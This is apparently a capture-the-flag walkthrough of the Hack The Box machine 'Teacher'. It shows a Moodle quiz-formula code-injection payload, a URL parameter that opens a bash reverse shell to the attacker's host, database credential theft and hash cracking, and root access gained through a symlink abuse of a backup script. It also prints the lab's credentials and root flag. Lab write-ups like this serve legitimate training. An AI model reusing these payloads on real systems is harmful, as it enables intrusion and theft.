# HTB - Teacher
## OS - Linux

Teacher's IP address is 10.10.10.153. Started with an nmap scan.
```
$nmap -sC -sV -oN nmap 10.10.10.153
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 07:59 PDT
Nmap scan report for 10.10.10.153
Host is up (0.088s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
```


Only port 80 is open.
The web interface shows a web page for school. There's an announcement that the web portal was new, that the students can submit their work. Only gallery.html seems to be working.

In the gallery page, the teacher photos are seen. One of the photos is not visible, the rest are not rendered properly. If we view the source of the page, we see that the photo that is not rendered is http://10.10.10.153/images/5.png.

When we curl that image, we see a note.
```
$curl http://10.10.10.153/images/5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni

```

Ran dirbuster but it stopped after a few errors. Gobuster worked fine.

```
$gobuster dir -t 40 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.153
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.153
[+] Threads:        40
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/06 12:05:28 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)

```
/moodle shows the Teachers page, and lists Algebra course with teacher Giovanni Chhatta.

Giovanni's link - http://10.10.10.153/moodle/user/view.php?id=3&course=1
Algebra course link - http://10.10.10.153/moodle/course/view.php?id=2

We try to login as giovanni using part of the password given above, and then enumerate using intruder to find the full password.

giovanni's password is Th4C00lTheacha#.

Exploring the site as giovanni shows a message to admin:
```
Hey admin.

How am I supposed to create a quiz? I'm kinda in a hurry since I need this for tomorrow.

Kind regards,
Giovanni
```

Took a while to repro this part, but finally, the formula worked for /*{a*/`$_REQUEST[rad]`;//{x}}

and then in the URL:
http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7

added the parameter:
&rad=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/6000+0>%261'

Got a nc shell.

```
$nc -lvnp 6000
listening on [any] 6000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.153] 48092
bash: cannot set terminal process group (829): Inappropriate ioctl for device
bash: no job control in this shell
www-data@teacher:/var/www/html/moodle/question$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@teacher:/var/www/html/moodle/question$ python -c 'import pty;pty.spawn("/bin/bash")'
<tion$ python -c 'import pty;pty.spawn("/bin/bash")'
```

There is a config.php in moodle that shows:
```
www-data@teacher:/var/www/html/moodle$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);

$CFG->wwwroot   = 'http://10.10.10.153/moodle';
$CFG->dataroot  = '/var/www/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
www-data@teacher:/var/www/html/moodle$ 
```

```
MariaDB [moodle]> select id,username,password from mdl_user;
+------+-------------+--------------------------------------------------------------+
| id   | username    | password                                                     |
+------+-------------+--------------------------------------------------------------+
|    1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
|    2 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
|    3 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| 1337 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+------+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)
```

went to crackstation to crack the last hash.
```
7a860966115182402ed06375cf0a22af	md5	expelled
```

We can use this password to su as giovanni and get the user flag.


To get root flag:
There is a backup script in /usr/bin.

```
giovanni@teacher:/usr/bin$ cat backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

```
giovanni@teacher:~/work$ mv courses courses.bak
giovanni@teacher:~/work$ ls
courses.bak  tmp
giovanni@teacher:~/work$ ln -s /root courses
giovanni@teacher:~/work$ ls -l
total 8
lrwxrwxrwx 1 giovanni giovanni    5 Sep  7 01:04 courses -> /root
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses.bak
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
giovanni@teacher:~/work$ cd courses
-su: cd: courses: Permission denied
giovanni@teacher:~/work$ cd tmp
giovanni@teacher:~/work/tmp$ ls
backup_courses.tar.gz  courses
giovanni@teacher:~/work/tmp$ cd courses/
giovanni@teacher:~/work/tmp/courses$ ls
algebra  root.txt
giovanni@teacher:~/work/tmp/courses$ cat root.txt 
4f3a83b42ac7723a508b8ace7b8b1209
giovanni@teacher:~/work/tmp/courses$ 
```
